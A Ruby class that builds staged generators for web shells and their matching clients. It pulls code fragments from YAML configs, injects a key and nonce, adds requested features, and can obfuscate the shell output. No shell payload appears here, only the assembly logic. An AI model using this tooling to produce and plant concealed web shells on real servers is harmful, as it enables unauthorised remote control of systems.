class GeneratorBuilder
  include Singleton

  def build_shell_generator(body, key, nonce)
    # Get the code factory
    code_factory = build_code_factory('shells', body['shell'])

    # Create the stage array and add the initial Base stage
    stages = []
    stages << Stage.new([AddCodeFragmentAction.new(code_factory, 'base', { 'KEY' => key })])

    # Create the features stage
    stages << build_features_stage(body, code_factory, nonce)

    # Add the Footer stage to complete the shell generation
    stages << Stage.new([AddCodeFragmentAction.new(code_factory, 'footer')])

    # Add the output generation stage
    stages << build_output_stage(:shell, body)

    # Create and return the generator
    Generator.new(stages)
  end

  def build_client_generator(body, key, nonce)
    # Get the code factory
    code_factory = build_code_factory('clients', body['client'])

    # Create the stage array and add the base stage
    stages = []
    stages << Stage.new([AddCodeFragmentAction.new(code_factory, 'base', { 'KEY' => key, 'NONCE' => nonce })])

    # Add the output stage
    stages << build_output_stage(:client, body)

    # Create and return the generator
    Generator.new(stages)
  end

  private

  def build_code_factory(directory, technology)
    # Create a code factory for the requested shell/client technology
    config_file = File.read("config/generator/#{directory}/#{technology}.yaml")
    configuration = ConfigurationParser.parse(config_file)

    # Return the code factory
    CodeFactory.new(configuration)
  end

  def build_features_stage(body, code_factory, nonce)
    actions = []
    body['features'].each do |feature|
      # Get the requested feature's key
      key = feature['key']

      # If there are arguments, build the argument's hash. Special case -> nonce
      arguments = {}
      if key == 'nonce-validation'
        arguments['NONCE'] = nonce
      elsif !feature['arguments'].nil?
        feature['arguments'].each { |argument| arguments[argument['name']] = argument['value'] }
      else
        arguments = nil
      end

      # Add the feature to the stage
      actions << AddCodeFragmentAction.new(code_factory, key, arguments)
    end

    # Return the stage
    Stage.new(actions)
  end

  def build_output_stage(type, body)
    # Add the output generation stage
    actions = []

    # If building the output for a shell, check if it must be obfuscated and get the format
    if type == :shell
      # Obfuscate the shell if needed
      obfuscator = Object.const_get("#{body['shell'].capitalize}Obfuscator").new
      actions << ObfuscateCodeAction.new(PhpObfuscator.new) if body['output']['obfuscate-code']

      # Select the output format for the shell
      format = Output.constants.detect { |format| format == body['output']['format'].upcase.to_sym }
    else
      # If not, select the output format for the client
      format = Output.constants.detect { |format| format == body['client'].upcase.to_sym }
    end

    # Add the output generation action and return the stage
    format = Output.const_get(format)
    actions << GenerateOutputFileAction.new(format)

    Stage.new(actions)
  end
end
